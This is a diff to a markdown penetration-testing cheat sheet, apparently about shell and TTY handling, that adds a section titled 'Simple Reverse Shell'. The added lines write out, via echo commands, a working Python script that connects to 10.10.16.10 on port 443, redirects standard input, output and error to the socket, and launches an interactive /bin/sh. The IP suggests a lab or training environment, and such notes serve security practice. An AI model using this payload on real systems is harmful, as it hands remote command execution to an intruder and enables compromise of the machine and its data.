@@ -123,6 +123,20 @@ fg (resume background job)
 stty rows 48 cols 186
 ```
 
+## Simple Reverse Shell
+
+```
+echo "import socket" > script.py
+echo "import subprocess" >> script.py
+echo "import os" >> script.py
+echo "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)" >> script.py
+echo 's.connect(("10.10.16.10",443))' >> script.py
+echo "os.dup2(s.fileno(),0)" >> script.py
+echo "os.dup2(s.fileno(),1)" >> script.py
+echo "os.dup2(s.fileno(),2)" >> script.py
+echo 'p=subprocess.call(["/bin/sh","-i"])' >> script.py
+```
+
 ## References:
 
 [http://unix.stackexchange.com/questions/122616/why-do-i-need-a-tty-to-run-sudo-if-i-can-sudo-without-a-password](http://unix.stackexchange.com/questions/122616/why-do-i-need-a-tty-to-run-sudo-if-i-can-sudo-without-a-password)  
